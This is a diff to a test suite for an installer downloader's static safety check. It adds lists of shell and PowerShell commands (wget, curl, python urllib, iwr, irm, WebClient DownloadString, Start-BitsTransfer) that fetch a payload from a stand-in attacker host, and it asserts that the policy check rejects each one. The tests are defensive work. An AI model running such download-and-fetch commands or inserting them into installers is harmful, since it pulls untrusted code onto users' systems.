@@ -381,6 +381,35 @@ describe('downloader static safety', () => {
         `${powershell()}\nInvoke-WebRequest -Uri 'https://attacker.invalid/payload'\n`,
       ),
     ).toThrow(/unapproved installer network destination/i)
+
+    const shellBypasses = [
+      'wget "https://attacker.invalid/payload"',
+      `python3 -c "import urllib.request; urllib.request.urlopen('https://attacker.invalid')"`,
+      'curl "$API_URL"; curl "https://attacker.invalid/payload"',
+      'curl "$DYNAMIC_URL"',
+      'curl "https://attacker.invalid/payload"',
+    ]
+    for (const bypass of shellBypasses) {
+      expect(() => verifyInstallerNetworkPolicy(`${shell()}\n${bypass}\n`, powershell()), bypass).toThrow(
+        /unapproved installer network destination/i,
+      )
+    }
+
+    const powershellBypasses = [
+      "iwr -Uri 'https://attacker.invalid/payload'",
+      "irm -Uri 'https://attacker.invalid/payload'",
+      "[Net.WebClient]::new().DownloadString('https://attacker.invalid/payload')",
+      '[Net.Http.HttpClient]::new()',
+      "Start-BitsTransfer -Source 'https://attacker.invalid/payload'",
+      "Invoke-WebRequest -Uri $ApiUrl; Invoke-WebRequest -Uri 'https://attacker.invalid/payload'",
+      'Invoke-WebRequest -Uri $DynamicUrl',
+      "Invoke-WebRequest -Uri 'https://attacker.invalid/payload'",
+    ]
+    for (const bypass of powershellBypasses) {
+      expect(() => verifyInstallerNetworkPolicy(shell(), `${powershell()}\n${bypass}\n`), bypass).toThrow(
+        /unapproved installer network destination/i,
+      )
+    }
   })
 
   it('uses exact architecture mapping, local SHA-256 verification, and verified launch ordering', () => {
